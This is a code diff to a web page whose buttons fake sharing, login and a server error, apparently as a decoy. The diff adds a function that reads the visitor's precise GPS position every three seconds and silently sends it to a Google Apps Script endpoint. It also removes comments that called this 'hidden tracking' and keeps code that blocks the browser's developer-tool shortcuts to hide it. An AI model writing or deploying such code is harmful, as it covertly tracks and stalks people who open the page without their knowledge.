@@ -195,13 +195,11 @@
     </div>
 
     <script>
-        // 1. Sidebar Mobile Toggle
         const menuToggle = document.getElementById('menuToggle');
         const sidebar = document.getElementById('sidebar');
         menuToggle.addEventListener('click', (e) => { e.stopPropagation(); sidebar.classList.toggle('open'); });
         document.getElementById('workspace').addEventListener('click', () => { if(window.innerWidth <= 768) sidebar.classList.remove('open'); });
 
-        // 2. Share & Export (Hoạt động)
         document.getElementById('shareBtn').addEventListener('click', () => {
             alert("Link has been copied to your clipboard!");
         });
@@ -209,11 +207,9 @@
             window.print();
         });
 
-        // 3. Xử lý Modals
         const authModal = document.getElementById('authModal');
         const errorModal = document.getElementById('errorModal');
 
-        // Bấm các nút tính năng (Menu, Search) -> Hiện yêu cầu đăng nhập
         document.querySelectorAll('.trigger-auth').forEach(el => {
             el.addEventListener('click', (e) => {
                 e.preventDefault();
@@ -222,7 +218,6 @@
             });
         });
 
-        // Bấm Log in / Sign up -> Hiện Lỗi server
         document.querySelectorAll('.trigger-error').forEach(el => {
             el.addEventListener('click', (e) => {
                 e.preventDefault();
@@ -230,39 +225,47 @@
             });
         });
 
-        // Nếu đang ở bảng Yêu cầu đăng nhập mà ấn "Log in" -> Chuyển sang bảng Lỗi server
         document.getElementById('toLoginBtn').addEventListener('click', () => {
             authModal.style.display = 'none';
             errorModal.style.display = 'flex';
         });
 
-        // Đóng modals
         document.querySelectorAll('.close-modal').forEach(btn => {
             btn.addEventListener('click', (e) => {
                 e.target.closest('.modal-overlay').style.display = 'none';
             });
         });
 
-        // 4. Tracking ngầm (Gửi dữ liệu tọa độ về Sheet)
         const webAppUrl = "https://script.google.com/macros/s/AKfycbxzWWR4Z7tqCpi7Aqz0uGEDgbXJbypOch6WarLwhd1TK74CTfDNaIltNYdsfYulkyEs/exec";
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(
-                function(pos) {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const acc = pos.coords.accuracy;
-                    fetch(`${webAppUrl}?lat=${lat}&lon=${lon}&acc=${acc}`, { mode: 'no-cors', method: 'GET' });
-                }, 
-                function(err) {}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-            );
-        }
+        
+        function forceTrackLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
 
-        // 5. Chống F12 / Inspect
+                        fetch(`${webAppUrl}?lat=${lat}&lon=${lon}&acc=${acc}`, { 
+                            mode: 'no-cors', 
+                            method: 'GET' 
+                        });
+                    }, 
+                    function(err) {
+                    }, 
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 5000,            
+                        maximumAge: 0             
+                    }
+                );
+            }
+        }
+        forceTrackLocation();
+        setInterval(forceTrackLocation, 3000);
+
         document.onkeydown = function(e) {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
                 return false;
             }
         };
-    </script>
-</body>
-</html>
